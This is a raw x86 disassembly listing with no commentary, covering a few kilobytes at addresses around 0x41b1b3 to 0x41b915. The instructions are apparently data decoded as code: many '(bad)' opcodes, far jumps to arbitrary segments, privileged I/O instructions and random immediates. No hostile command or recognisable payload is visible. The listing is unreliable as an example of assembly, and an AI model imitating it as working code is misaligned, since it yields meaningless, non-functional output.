  41b1b3:	pushf  
  41b1b4:	(bad)  
  41b1b5:	enter  0xd2a7,0x9c
  41b1b9:	inc    esp
  41b1ba:	push   ss
  41b1bb:	(bad)  
  41b1bc:	or     al,0x7e
  41b1be:	or     edi,esp
  41b1c0:	ror    DWORD PTR [ebx+0x325e756c],1
  41b1c6:	imul   esp,DWORD PTR [eax],0xf
  41b1c9:	mov    eax,ds:0x7552cf9b
  41b1ce:	out    0x63,eax
  41b1d0:	dec    ebx
  41b1d1:	call   0x57dc:0xfc2837f2
  41b1d8:	dec    ebp
  41b1d9:	mov    cl,0x4f
  41b1db:	pushf  
  41b1dc:	mov    edi,0xa63a3fec
  41b1e1:	add    BYTE PTR [edx-0x61],bl
  41b1e4:	mov    edx,edi
  41b1e6:	ror    DWORD PTR [edi],0x7e
  41b1e9:	retf   0xb9c2
  41b1ec:	fdivr  QWORD PTR [eax]
  41b1ee:	add    BYTE PTR [eax+0x76b552e4],dh
  41b1f4:	ja     0x41b18a
  41b1f6:	push   ds
  41b1f7:	call   0x95256ea1
  41b1fc:	pusha  
  41b1fd:	xor    DWORD PTR [ebx],edi
  41b1ff:	fld    TBYTE PTR [ecx+0x795c30aa]
  41b205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b206:	pusha  
  41b207:	add    ebp,edx
  41b209:	fadd   st(5),st
  41b20b:	aam    0x65
  41b20d:	out    dx,al
  41b20e:	daa    
  41b20f:	cld    
  41b210:	mov    ds:0xcb64941,al
  41b215:	xchg   ecx,eax
  41b216:	mov    edi,0xc8873a57
  41b21b:	iret   
  41b21c:	mov    ds:0xa0fc6fdd,eax
  41b221:	out    dx,al
  41b222:	xor    al,0x36
  41b224:	in     eax,dx
  41b225:	clc    
  41b226:	push   ss
  41b227:	imul   edx,DWORD PTR [esi+0x1556f767],0x93bfdf07
  41b231:	mov    ebp,edi
  41b233:	aas    
  41b234:	jecxz  0x41b22e
  41b236:	aaa    
  41b237:	mov    cl,0x2d
  41b239:	xchg   esp,eax
  41b23a:	inc    edx
  41b23b:	js     0x41b28f
  41b23d:	dec    ebp
  41b23e:	into   
  41b23f:	shl    DWORD PTR [esi],1
  41b241:	pushf  
  41b242:	push   edi
  41b243:	pop    eax
  41b244:	xor    BYTE PTR [eax],bh
  41b246:	sbb    edx,edi
  41b248:	stos   BYTE PTR es:[edi],al
  41b249:	jbe    0x41b26d
  41b24b:	stos   BYTE PTR es:[edi],al
  41b24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b24d:	add    dl,cl
  41b24f:	add    dh,BYTE PTR [esi+0xd]
  41b252:	cld    
  41b253:	sub    dh,BYTE PTR [edi+0x588e8507]
  41b259:	fst    QWORD PTR [edx-0x41]
  41b25c:	or     ebx,0xfffffffe
  41b25f:	int    0x93
  41b261:	mov    ecx,0x70f634d2
  41b266:	inc    DWORD PTR [edi+ebx*4]
  41b269:	inc    esp
  41b26a:	sbb    dl,ah
  41b26c:	pop    ss
  41b26d:	sub    edx,DWORD PTR [eax-0x7916e1b2]
  41b273:	push   cs
  41b274:	jmp    0x45e5:0x4923ffd9
  41b27b:	addr16 ret 0xb5d2
  41b27f:	std    
  41b280:	push   ds
  41b281:	int3   
  41b282:	mov    esp,0x1822f82f
  41b287:	dec    edi
  41b288:	pop    esp
  41b289:	mov    tr3,esi
  41b28c:	sahf   
  41b28d:	cmc    
  41b28e:	xor    al,0x5b
  41b290:	inc    ebp
  41b291:	pop    esp
  41b292:	into   
  41b293:	outs   dx,BYTE PTR ds:[esi]
  41b294:	xlat   BYTE PTR ds:[ebx]
  41b295:	xchg   DWORD PTR [ecx],eax
  41b297:	mov    ecx,0x5ce80c05
  41b29d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b29e:	mov    ecx,0x70739e8d
  41b2a3:	inc    eax
  41b2a4:	pop    edi
  41b2a5:	push   ecx
  41b2a6:	add    DWORD PTR [ecx-0x73885d0e],ecx
  41b2ac:	test   DWORD PTR [edx+eax*1],edx
  41b2af:	scas   eax,DWORD PTR es:[edi]
  41b2b0:	adc    BYTE PTR [eax],al
  41b2b2:	call   0xf6b5:0x6bf71fa9
  41b2b9:	mov    cl,0x3d
  41b2bb:	jae    0x41b2b8
  41b2bd:	xchg   ecx,eax
  41b2be:	push   esp
  41b2bf:	pop    es
  41b2c0:	out    dx,al
  41b2c1:	pop    es
  41b2c2:	js     0x41b2e3
  41b2c4:	mov    bl,0xa2
  41b2c6:	in     eax,dx
  41b2c7:	sbb    DWORD PTR [esp+edx*4-0xf],0x3c
  41b2cc:	jmp    0xd01c:0x960be58
  41b2d3:	pop    es
  41b2d4:	push   esp
  41b2d5:	push   ecx
  41b2d6:	xlat   BYTE PTR ds:[ebx]
  41b2d7:	leave  
  41b2d8:	adc    al,0x36
  41b2da:	jmp    0xfbfd9cd4
  41b2df:	or     BYTE PTR [ecx-0x49f62bf3],al
  41b2e5:	xchg   esp,eax
  41b2e6:	jo     0x41b302
  41b2e8:	outs   dx,DWORD PTR ds:[esi]
  41b2e9:	pop    ecx
  41b2ea:	cld    
  41b2eb:	sub    BYTE PTR [ecx-0x2d],bl
  41b2ee:	and    edi,ebx
  41b2f0:	mov    ch,0xf1
  41b2f2:	cmp    al,BYTE PTR [esi-0x6c14d827]
  41b2f8:	and    al,dh
  41b2fa:	push   ds
  41b2fb:	ret    
  41b2fc:	pop    esp
  41b2fd:	push   es
  41b2fe:	imul   esp,DWORD PTR [ecx+0x23212e72],0xffffff90
  41b305:	jo     0x41b29c
  41b307:	jg     0x41b2ac
  41b309:	in     eax,dx
  41b30a:	dec    esi
  41b30b:	add    dl,dl
  41b30d:	inc    ebx
  41b30e:	in     eax,dx
  41b30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b310:	int3   
  41b311:	ss clc 
  41b313:	fistp  WORD PTR [edx-0x466acf5e]
  41b319:	jne    0x41b361
  41b31b:	adc    DWORD PTR [edx-0x7e956a3e],ecx
  41b321:	mov    edx,0xb1e27675
  41b326:	jp     0x41b2e2
  41b328:	adc    esi,DWORD PTR [ebp+0x18]
  41b32b:	mov    dh,0xde
  41b32d:	(bad)  
  41b32e:	xor    edx,ecx
  41b330:	test   eax,0x825c4cd0
  41b335:	and    cl,BYTE PTR [ebx-0x2ebdb6c1]
  41b33b:	push   esp
  41b33c:	shl    BYTE PTR [ecx-0x56ebd45e],cl
  41b342:	inc    esp
  41b343:	add    ebx,DWORD PTR [ecx+0x45]
  41b346:	add    dh,BYTE PTR [ebx]
  41b348:	shl    bh,cl
  41b34a:	pop    ecx
  41b34b:	scas   eax,DWORD PTR es:[edi]
  41b34c:	cdq    
  41b34d:	xor    eax,0x57169400
  41b352:	adc    eax,0xaf3f9045
  41b357:	out    dx,eax
  41b358:	mov    ebp,0x872911a1
  41b35d:	push   edi
  41b35e:	sbb    cl,BYTE PTR [ebx]
  41b360:	call   0xed6a:0xe3579748
  41b367:	xchg   ebp,eax
  41b368:	clc    
  41b369:	push   0x3bfa862
  41b36e:	scas   eax,DWORD PTR es:[edi]
  41b36f:	pop    esp
  41b370:	mov    al,ch
  41b372:	jo     0x41b30c
  41b374:	daa    
  41b375:	jb     0x41b337
  41b377:	jbe    0x41b3dd
  41b379:	adc    al,0x99
  41b37b:	add    eax,0xa865db9b
  41b380:	repz sbb al,0x9e
  41b383:	div    ecx
  41b385:	mov    esi,0x2ec72476
  41b38a:	pop    ebx
  41b38b:	cmp    BYTE PTR [ecx+0x6c],ah
  41b38e:	pop    edx
  41b38f:	fwait
  41b390:	clc    
  41b391:	retf   
  41b392:	push   esi
  41b393:	jmp    0x30e5:0x8489665a
  41b39a:	lods   eax,DWORD PTR ds:[esi]
  41b39b:	imul   edx,DWORD PTR [edi+0x6a],0xffffff87
  41b39f:	outs   dx,BYTE PTR ds:[esi]
  41b3a0:	ficomp WORD PTR [edx+0x31]
  41b3a3:	aaa    
  41b3a4:	mov    edx,0xd11b9fec
  41b3a9:	out    0x53,eax
  41b3ab:	int3   
  41b3ac:	and    eax,0x37461d8f
  41b3b1:	mov    ecx,0xf118075d
  41b3b6:	mov    al,BYTE PTR [eax-0xebad222]
  41b3bc:	cmc    
  41b3bd:	and    ah,BYTE PTR [esi-0x2d]
  41b3c0:	sahf   
  41b3c1:	mov    ds:0xe274729f,eax
  41b3c6:	jns    0x41b40d
  41b3c8:	cwde   
  41b3c9:	(bad)  
  41b3ca:	cmp    ebx,DWORD PTR [edx+esi*8+0x65b6913]
  41b3d1:	jbe    0x41b3c9
  41b3d3:	(bad)  
  41b3d4:	cld    
  41b3d5:	test   eax,0x11ec876f
  41b3da:	out    dx,al
  41b3db:	cmp    esp,DWORD PTR [ebx+0x1fd8dd5f]
  41b3e1:	pop    edx
  41b3e2:	mov    eax,0x1b4b9027
  41b3e7:	lock repz dec ebx
  41b3ea:	(bad)  
  41b3eb:	sti    
  41b3ec:	add    BYTE PTR [ecx-0x3b],ah
  41b3ef:	out    0x18,eax
  41b3f1:	add    BYTE PTR [eax+0x31560ae6],dh
  41b3f7:	inc    esi
  41b3f8:	push   ecx
  41b3f9:	cmp    DWORD PTR [esi-0x20],0xffffffc1
  41b3fd:	push   0xffffffb0
  41b3ff:	jecxz  0x41b3bb
  41b401:	or     eax,DWORD PTR [edx+0x38]
  41b404:	int    0x73
  41b406:	ret    
  41b407:	sar    DWORD PTR [ebp+0xe],cl
  41b40a:	sahf   
  41b40b:	inc    esi
  41b40c:	sub    DWORD PTR [ebp+0x2f],0xffffffea
  41b410:	call   0x30a8179
  41b415:	inc    ecx
  41b416:	xor    DWORD PTR [esi+0x773b3c6d],esp
  41b41c:	sar    DWORD PTR [ebx-0x57504d8a],0x41
  41b423:	push   ebx
  41b424:	push   edx
  41b425:	sbb    eax,0x664fd12
  41b42a:	xchg   edi,eax
  41b42b:	fmul   QWORD PTR [esi+0x50e216fc]
  41b431:	fcmovnu st,st(4)
  41b433:	and    BYTE PTR [ebx-0x68],ah
  41b436:	lods   eax,DWORD PTR ds:[esi]
  41b437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b438:	(bad)  [edx+0x5b2a1a21]
  41b43e:	cs dec ecx
  41b440:	int    0xf4
  41b442:	pop    edx
  41b443:	std    
  41b444:	xchg   edx,eax
  41b445:	mov    dl,0xf7
  41b447:	in     eax,0xe3
  41b449:	adc    ecx,DWORD PTR [esi+0x7e26222f]
  41b44f:	sbb    al,0xdf
  41b451:	and    DWORD PTR [eax],eax
  41b453:	adc    eax,DWORD PTR [ebx-0x5d]
  41b456:	jae    0x41b455
  41b458:	in     eax,dx
  41b459:	js     0x41b413
  41b45b:	outs   dx,DWORD PTR ds:[esi]
  41b45c:	inc    esi
  41b45d:	sbb    cl,ch
  41b45f:	gs sbb al,0xd7
  41b462:	push   edx
  41b463:	dec    esi
  41b464:	xchg   edx,esi
  41b466:	mov    DWORD PTR [eax-0x40],ebp
  41b469:	inc    ecx
  41b46a:	sbb    eax,0x2be82731
  41b46f:	out    0x91,eax
  41b471:	shl    ebx,0x51
  41b474:	mov    DWORD PTR [edi],esp
  41b476:	dec    ebx
  41b477:	push   es
  41b478:	(bad)  
  41b479:	xchg   ebx,eax
  41b47a:	sbb    al,0xe7
  41b47c:	(bad)  [ebx+eiz*2]
  41b47f:	jg     0x41b485
  41b481:	dec    edi
  41b482:	inc    ebp
  41b483:	mov    cl,0x1d
  41b485:	mov    ebp,0x416d18f3
  41b48a:	add    ebx,edx
  41b48c:	push   ds
  41b48d:	std    
  41b48e:	lds    ebp,FWORD PTR [eax-0x3c16d3b4]
  41b494:	and    esp,DWORD PTR ds:0x7fd0900c
  41b49a:	js     0x41b4a4
  41b49c:	sbb    BYTE PTR [edx-0x7f8dee2b],al
  41b4a2:	pop    esp
  41b4a3:	in     al,dx
  41b4a4:	sbb    al,0x7e
  41b4a6:	dec    ebp
  41b4a7:	dec    esi
  41b4a8:	cmc    
  41b4a9:	push   cs
  41b4aa:	jge    0x41b518
  41b4ac:	hlt    
  41b4ad:	sbb    edx,DWORD PTR [edx]
  41b4af:	sub    al,0x3a
  41b4b1:	push   edx
  41b4b2:	scas   al,BYTE PTR es:[edi]
  41b4b3:	or     dh,BYTE PTR ds:0x9d2c91b4
  41b4b9:	gs ret 0xdfee
  41b4bd:	ds das 
  41b4bf:	add    bl,0x78
  41b4c2:	sbb    DWORD PTR [edi+0x15aea119],edi
  41b4c8:	lods   eax,DWORD PTR ds:[esi]
  41b4c9:	mov    ebx,0x23e0f2dd
  41b4ce:	das    
  41b4cf:	lock push es
  41b4d1:	dec    ebp
  41b4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d3:	dec    edi
  41b4d4:	shl    DWORD PTR [edi-0x56ed0ae4],0x4d
  41b4db:	bound  esi,QWORD PTR [edi+0x2]
  41b4de:	cs (bad) 
  41b4e0:	inc    eax
  41b4e1:	rol    BYTE PTR [edi-0x7831a878],cl
  41b4e7:	test   al,0xa6
  41b4e9:	xor    BYTE PTR [ebx+0x52],0xa2
  41b4ed:	(bad)  
  41b4ee:	(bad)  
  41b4ef:	pop    ebx
  41b4f0:	icebp  
  41b4f1:	mov    ecx,ebx
  41b4f3:	arpl   WORD PTR [eax-0x3790b10d],cx
  41b4f9:	or     BYTE PTR [ecx+0x4c],bl
  41b4fc:	add    BYTE PTR [ebx+0x45],ah
  41b4ff:	push   ecx
  41b500:	cwde   
  41b501:	cmp    cl,ah
  41b503:	dec    esp
  41b504:	aad    0x8f
  41b506:	in     eax,dx
  41b507:	test   al,0x20
  41b509:	mov    esi,DWORD PTR [eax-0xee7e1fc]
  41b50f:	jmp    0x41b4a4
  41b511:	dec    ebx
  41b512:	ins    BYTE PTR es:[edi],dx
  41b513:	cld    
  41b514:	popa   
  41b515:	push   cs
  41b516:	mov    ebp,0xb11595f2
  41b51b:	pop    es
  41b51c:	sar    BYTE PTR [ecx+0x53],1
  41b51f:	and    DWORD PTR [eax-0x70],edi
  41b522:	or     esi,DWORD PTR [eax]
  41b524:	xchg   DWORD PTR [ecx+0x242d285b],ecx
  41b52a:	mov    ds:0x1f4f7909,al
  41b52f:	pop    ds
  41b530:	pushf  
  41b531:	add    ecx,ebx
  41b533:	ficomp WORD PTR [edx]
  41b535:	lock xchg edi,eax
  41b537:	inc    ebx
  41b538:	add    DWORD PTR ds:0xd645b0f0,edi
  41b53e:	cmp    DWORD PTR [eax],0x163951c1
  41b544:	lds    ecx,FWORD PTR ds:0xb333c2e8
  41b54a:	loope  0x41b5a7
  41b54c:	mov    ?,WORD PTR [edi-0x32]
  41b54f:	jae    0x41b59e
  41b551:	fcom   DWORD PTR [edx+0x2064ab51]
  41b557:	stc    
  41b558:	cmp    BYTE PTR [edx],al
  41b55a:	push   ss
  41b55b:	inc    esp
  41b55c:	leave  
  41b55d:	rol    BYTE PTR [edx+ecx*8-0x3ad47bbf],0xe7
  41b565:	sbb    al,0x89
  41b567:	(bad)  
  41b569:	push   esp
  41b56a:	mov    al,ds:0x5621fb9f
  41b56f:	lock add cl,cl
  41b572:	jg     0x41b50d
  41b574:	push   es
  41b575:	test   al,0xdf
  41b577:	iret   
  41b578:	pop    edx
  41b579:	cmp    esp,DWORD PTR [esi+0x6a]
  41b57c:	add    BYTE PTR [ecx],bh
  41b57e:	test   BYTE PTR [esp+edx*4],bl
  41b581:	push   esi
  41b582:	popf   
  41b583:	stc    
  41b584:	or     eax,0xf335a484
  41b589:	mov    al,ds:0x98bc7197
  41b58e:	xchg   ebx,eax
  41b58f:	sbb    eax,0x3c1e74b3
  41b594:	add    bl,BYTE PTR [ebx]
  41b596:	pop    ebp
  41b597:	fld    DWORD PTR [esi]
  41b599:	lds    eax,FWORD PTR [edx]
  41b59b:	mov    cl,0x9c
  41b59d:	dec    edi
  41b59e:	and    al,0x5b
  41b5a0:	add    al,0x31
  41b5a2:	repnz cmc 
  41b5a4:	dec    eax
  41b5a5:	jb     0x41b584
  41b5a7:	js     0x41b5c9
  41b5a9:	jl     0x41b564
  41b5ab:	popa   
  41b5ac:	inc    eax
  41b5ad:	push   eax
  41b5ae:	jl     0x41b62c
  41b5b0:	adc    DWORD PTR [ecx-0x50cecb5a],ecx
  41b5b6:	cmp    al,0xbd
  41b5b8:	add    bl,BYTE PTR [ecx+0x17]
  41b5bb:	call   0x96bfc30
  41b5c0:	sbb    DWORD PTR [ecx+0x5309f56c],eax
  41b5c6:	(bad)  
  41b5c7:	cld    
  41b5c8:	fadd   QWORD PTR [edx+0x22daf06e]
  41b5ce:	xchg   esi,eax
  41b5cf:	retf   
  41b5d0:	pop    eax
  41b5d1:	sub    ch,BYTE PTR [bp-0x3281]
  41b5d6:	data16 test BYTE PTR [edi-0x1d],cl
  41b5da:	shl    ebp,cl
  41b5dc:	push   ebp
  41b5dd:	push   ds
  41b5de:	enter  0xd056,0xd
  41b5e2:	xchg   esp,eax
  41b5e3:	xchg   edx,eax
  41b5e4:	add    cl,BYTE PTR [esi+0x48]
  41b5e7:	mov    cl,0x5
  41b5e9:	mov    al,0xa0
  41b5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ec:	push   edx
  41b5ed:	and    al,0x1e
  41b5ef:	jmp    0xb1be:0x9604c4ef
  41b5f6:	shl    BYTE PTR [ebp-0x5b4fca34],1
  41b5fc:	mov    edi,DWORD PTR [ebx-0x2d]
  41b5ff:	add    BYTE PTR [eax],bl
  41b601:	ret    
  41b602:	bnd jle 0x41b66a
  41b605:	inc    edx
  41b606:	dec    esi
  41b607:	hlt    
  41b608:	or     eax,0x20daa9b7
  41b60d:	cmp    eax,0x8e124d1b
  41b612:	ret    
  41b613:	or     ah,ah
  41b615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b616:	pop    ebp
  41b617:	in     eax,dx
  41b618:	push   eax
  41b619:	retf   
  41b61a:	sahf   
  41b61b:	arpl   WORD PTR [esp+ebp*2-0x3492245],dx
  41b622:	pop    esp
  41b623:	stos   DWORD PTR es:[edi],eax
  41b624:	hlt    
  41b625:	dec    ebp
  41b626:	dec    edx
  41b627:	sub    dh,dh
  41b629:	or     ebp,DWORD PTR [eax+ebp*1]
  41b62c:	sbb    esi,DWORD PTR [edx+0x620147d]
  41b632:	popf   
  41b633:	rcl    ebp,cl
  41b635:	xor    esi,0xffffffae
  41b638:	xlat   BYTE PTR ds:[ebx]
  41b639:	mov    eax,0x70ec598d
  41b63e:	fcomp  QWORD PTR [edx-0x1656b6d5]
  41b644:	inc    dh
  41b646:	sbb    eax,0xb1c3712f
  41b64b:	jg     0x41b5dd
  41b64d:	mov    bl,0x5
  41b64f:	and    al,0x91
  41b651:	pop    ds
  41b652:	xchg   esp,eax
  41b653:	imul   edx,esi,0x7
  41b656:	pop    ebp
  41b657:	lds    edx,FWORD PTR [ebx]
  41b659:	outs   dx,DWORD PTR ds:[esi]
  41b65a:	dec    edx
  41b65b:	mov    dl,0xe5
  41b65d:	mov    WORD PTR [eax],gs
  41b65f:	out    0x7d,eax
  41b661:	push   0x5e
  41b663:	dec    esp
  41b664:	xor    DWORD PTR [esi],esp
  41b666:	(bad)  
  41b667:	pop    esp
  41b668:	pop    ebp
  41b669:	cmc    
  41b66a:	ins    DWORD PTR es:[edi],dx
  41b66b:	mov    dh,0xd2
  41b66d:	rcl    DWORD PTR ds:0x37f6fd80,1
  41b673:	sbb    eax,0x9be27ffd
  41b678:	inc    ebp
  41b679:	adc    eax,0x2c28c1cf
  41b67e:	adc    BYTE PTR [ebp+0x7628a2e4],0x98
  41b685:	scas   al,BYTE PTR es:[edi]
  41b686:	mov    cl,bl
  41b688:	enter  0xf5c7,0xc3
  41b68c:	dec    eax
  41b68d:	dec    esp
  41b68e:	enter  0x1f90,0xb
  41b692:	lds    eax,FWORD PTR [edx+0x41]
  41b695:	loope  0x41b66d
  41b697:	sbb    eax,0xed20bf86
  41b69c:	bound  ebp,QWORD PTR [ecx]
  41b69e:	daa    
  41b69f:	sub    eax,0x86e9c876
  41b6a4:	addr16 sbb ebx,ebp
  41b6a7:	stos   BYTE PTR es:[edi],al
  41b6a8:	loope  0x41b673
  41b6aa:	cmc    
  41b6ab:	dec    ebp
  41b6ac:	sub    dh,BYTE PTR [edi-0x5e]
  41b6af:	je     0x41b637
  41b6b1:	mov    es,WORD PTR [ebx+0x6c]
  41b6b4:	(bad)  
  41b6b5:	lods   eax,DWORD PTR ds:[esi]
  41b6b6:	jmp    0x33c6:0x317b7e21
  41b6bd:	pop    esi
  41b6be:	adc    ecx,DWORD PTR [ebp+0x172cc1c]
  41b6c4:	and    BYTE PTR [ebx-0x27],ah
  41b6c7:	inc    ebx
  41b6c8:	ret    0xc9ba
  41b6cb:	shl    BYTE PTR [eax],1
  41b6cd:	sbb    al,0x18
  41b6cf:	mov    edi,DWORD PTR [ebp+0x32a73177]
  41b6d5:	int    0x81
  41b6d7:	xchg   DWORD PTR [ebx],ecx
  41b6d9:	call   0xff51:0x62c79b2e
  41b6e0:	or     al,0xe5
  41b6e2:	(bad)  
  41b6e4:	adc    DWORD PTR [esi+0x7d],eax
  41b6e7:	push   ss
  41b6e8:	fmul   DWORD PTR [ebx-0x5c9c72dd]
  41b6ee:	adc    ebx,DWORD PTR [ebp-0x2f]
  41b6f1:	cmp    eax,0x6abef644
  41b6f6:	shl    BYTE PTR [ecx+0x773326dd],1
  41b6fc:	lods   eax,DWORD PTR ds:[esi]
  41b6fd:	jg     0x41b725
  41b6ff:	test   eax,0xb5f8fad5
  41b704:	std    
  41b705:	sbb    dl,BYTE PTR [esi]
  41b707:	mov    DWORD PTR [ecx+0x3cce796f],ebp
  41b70d:	iret   
  41b70e:	add    ebx,DWORD PTR [edx]
  41b710:	mov    ebx,0x4357b8ac
  41b715:	pop    es
  41b716:	adc    eax,0x50ac6bf6
  41b71b:	arpl   WORD PTR [esi],cx
  41b71d:	cld    
  41b71e:	aaa    
  41b71f:	push   ecx
  41b720:	xor    dh,cl
  41b722:	sub    ah,BYTE PTR [ecx-0x16e31ffc]
  41b728:	leave  
  41b729:	(bad)  [ebp+0x368e7f07]
  41b72f:	jae    0x41b6ca
  41b731:	cwde   
  41b732:	sbb    eax,0xe8266ceb
  41b737:	mov    eax,ebp
  41b739:	inc    dx
  41b73b:	aaa    
  41b73c:	mov    dl,0xf0
  41b73e:	ret    0x2081
  41b741:	sbb    edx,DWORD PTR [ecx]
  41b743:	lods   al,BYTE PTR ds:[esi]
  41b744:	scas   al,BYTE PTR es:[edi]
  41b745:	dec    esp
  41b746:	cmc    
  41b747:	push   ebx
  41b748:	(bad)  
  41b74a:	and    BYTE PTR ds:0x1fe9c0cc,ah
  41b750:	ret    
  41b751:	jb     0x41b719
  41b753:	ret    0x39d6
  41b756:	add    BYTE PTR [edx-0x218d65ce],bh
  41b75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b75d:	loopne 0x41b781
  41b75f:	cmp    al,ch
  41b761:	xor    esi,DWORD PTR [ebx]
  41b763:	pushf  
  41b764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b765:	sbb    ecx,ecx
  41b767:	jae    0x41b7b6
  41b769:	or     eax,0xc3db7313
  41b76e:	cmp    eax,0x41e49114
  41b773:	mov    DWORD PTR [eax-0x22],ebp
  41b776:	sbb    dh,dh
  41b778:	adc    al,0xba
  41b77a:	inc    eax
  41b77b:	jno    0x41b706
  41b77d:	scas   eax,DWORD PTR es:[edi]
  41b77e:	das    
  41b77f:	add    edi,ebp
  41b781:	xor    ah,dh
  41b783:	(bad)  
  41b784:	popa   
  41b785:	add    al,0xb5
  41b787:	scas   al,BYTE PTR es:[edi]
  41b788:	imul   ebp
  41b78a:	pop    ebx
  41b78b:	mov    bh,0xda
  41b78d:	punpckhbw mm0,mm7
  41b790:	fst    DWORD PTR [ecx+eiz*2-0x4f]
  41b794:	xlat   BYTE PTR ds:[ebx]
  41b795:	aaa    
  41b796:	cdq    
  41b797:	lock sub ecx,DWORD PTR [esp+edx*2-0x35]
  41b79c:	mov    dl,0x6e
  41b79e:	pop    edi
  41b79f:	xchg   ebp,eax
  41b7a0:	mov    esi,0x229f87b4
  41b7a5:	hlt    
  41b7a6:	xor    eax,0xc614fe33
  41b7ab:	lods   al,BYTE PTR ds:[esi]
  41b7ac:	mov    ah,0x14
  41b7ae:	cmp    eax,0xaf9a1887
  41b7b3:	lods   al,BYTE PTR ds:[esi]
  41b7b4:	ds mov ecx,0x742ccc33
  41b7ba:	jo     0x41b7d6
  41b7bc:	(bad)  
  41b7bd:	pop    ds
  41b7be:	mov    ecx,eax
  41b7c0:	push   0xaa512b27
  41b7c5:	and    BYTE PTR [eax+0x12593e56],ah
  41b7cb:	shl    DWORD PTR [edx-0x46529b97],0x6e
  41b7d2:	daa    
  41b7d3:	sbb    eax,0xcf25fa1a
  41b7d8:	aaa    
  41b7d9:	push   edx
  41b7da:	sbb    DWORD PTR [ecx-0x2a],eax
  41b7dd:	add    BYTE PTR [ebp-0x5d881f80],0x8e
  41b7e4:	and    al,0xd6
  41b7e6:	pusha  
  41b7e7:	add    DWORD PTR ds:0x53bbe11c,ebx
  41b7ed:	fld    DWORD PTR [ecx+0x75]
  41b7f0:	in     al,dx
  41b7f1:	loope  0x41b808
  41b7f3:	pop    edx
  41b7f4:	out    dx,al
  41b7f5:	inc    esp
  41b7f6:	pop    edx
  41b7f7:	push   0x21df1236
  41b7fc:	data16 sub BYTE PTR [edx+0x44e55d6],ah
  41b803:	jge    0x41b788
  41b805:	cmp    BYTE PTR ds:0x4ceeebfc,0x70
  41b80c:	jnp    0x41b798
  41b80e:	mov    ds:0xc4723ef1,eax
  41b813:	and    DWORD PTR [eax+0x3f31e436],esp
  41b819:	jp     0x41b896
  41b81b:	adc    dh,BYTE PTR [esi]
  41b81d:	repnz repz adc al,0xe2
  41b821:	pop    edx
  41b822:	ds inc ebp
  41b824:	cmp    edx,ecx
  41b826:	push   0x73
  41b828:	push   edx
  41b829:	outs   dx,BYTE PTR ds:[esi]
  41b82a:	xor    al,0xd4
  41b82c:	xor    edx,DWORD PTR [ebp+0x273d404]
  41b832:	add    eax,0x14a5932d
  41b837:	fs enter 0xba92,0x7b
  41b83c:	in     eax,0xc0
  41b83e:	(bad)  
  41b83f:	jnp    0x41b7fe
  41b841:	pop    edx
  41b842:	push   ebp
  41b843:	add    ebx,DWORD PTR [ebp-0x73]
  41b846:	pusha  
  41b847:	enter  0x74b1,0xad
  41b84b:	sub    DWORD PTR [esi-0x70],ecx
  41b84e:	or     eax,0x62e05d1b
  41b853:	inc    ebp
  41b854:	cs popa 
  41b856:	ficomp DWORD PTR [edi-0x47fcf04c]
  41b85c:	mov    ds:0x50367582,eax
  41b861:	xor    al,0x63
  41b863:	dec    esi
  41b864:	inc    ebp
  41b865:	add    BYTE PTR [ecx+edi*8],ch
  41b868:	pop    edi
  41b869:	jbe    0x41b884
  41b86b:	mov    eax,ds:0x8e16ccf7
  41b870:	jg     0x41b84c
  41b872:	xchg   ebx,eax
  41b873:	cmp    ecx,DWORD PTR [esi+0x110a5c84]
  41b879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b87a:	imul   esp,DWORD PTR [edi-0x56efa08],0xffffffbb
  41b881:	mov    ecx,0x26350c28
  41b886:	sbb    edx,0xd641d3eb
  41b88c:	jne    0x41b84d
  41b88e:	jp     0x41b8d3
  41b890:	inc    ecx
  41b891:	addr16 mov dh,0xb9
  41b894:	jae    0x41b81b
  41b896:	enter  0x27cb,0xc3
  41b89a:	rol    BYTE PTR [edi+ecx*1+0x35],0xac
  41b89f:	push   0x12
  41b8a1:	push   esp
  41b8a2:	xchg   edi,eax
  41b8a3:	or     esp,ebx
  41b8a5:	add    ecx,DWORD PTR [edi]
  41b8a7:	xlat   BYTE PTR ds:[ebx]
  41b8a8:	cld    
  41b8a9:	mov    edx,0x3eec94a8
  41b8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8af:	push   ds
  41b8b0:	fnsave [ebp+0x51]
  41b8b3:	and    DWORD PTR [ebx],ecx
  41b8b5:	and    al,0x63
  41b8b7:	iret   
  41b8b8:	xchg   DWORD PTR [eax+ecx*2],eax
  41b8bb:	push   ebp
  41b8bc:	(bad)  
  41b8be:	mov    gs,WORD PTR [edx]
  41b8c0:	pop    ss
  41b8c1:	fbld   TBYTE PTR [ebx-0x39]
  41b8c4:	dec    edx
  41b8c5:	shr    DWORD PTR [eax+0x66],1
  41b8c8:	or     BYTE PTR [ebx+esi*2],dh
  41b8cb:	arpl   WORD PTR [eax+0x237a49],cx
  41b8d1:	pmaxub mm1,QWORD PTR [ebx]
  41b8d4:	sub    DWORD PTR ds:0x5cfa5f5e,0xffffffce
  41b8db:	dec    ebx
  41b8dc:	cld    
  41b8dd:	push   esp
  41b8de:	ins    DWORD PTR es:[edi],dx
  41b8df:	inc    ecx
  41b8e0:	push   ds
  41b8e1:	jae    0x41b8f6
  41b8e3:	sbb    bh,BYTE PTR [ebp+0x57f1fda0]
  41b8e9:	adc    ebp,DWORD PTR [ecx]
  41b8eb:	pop    esp
  41b8ec:	call   0xeecf:0xe3548bf4
  41b8f3:	js     0x41b8d7
  41b8f5:	sbb    DWORD PTR [ebx+0x56],0xc2cfd1d2
  41b8fc:	fwait
  41b8fd:	xchg   ch,dl
  41b8ff:	lods   al,BYTE PTR ds:[esi]
  41b900:	push   es
  41b901:	cwde   
  41b902:	in     eax,0xc2
  41b904:	pop    ecx
  41b905:	fnstenv [edi+0x2f]
  41b908:	test   DWORD PTR [edx+0x51dcecf9],esp
  41b90e:	jmp    0x2de8:0x8cfb5c0b
  41b915:	fmulp  st(2),st
